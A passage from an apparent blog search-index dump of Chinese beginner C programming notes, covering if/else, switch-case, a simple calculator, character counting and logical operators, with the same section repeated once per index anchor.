{ int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#判断闰年"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#常用的数学函数"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include\u003cstdio.h\u003e int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include\u003cstdio.h\u003e int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#32分支"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌套的判断"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#else的匹配"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#级联的if-else-if"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#if语句常见错误"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#switch-case"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#简单的计算器程序"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符统计"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逻辑运算符"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#单目"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': 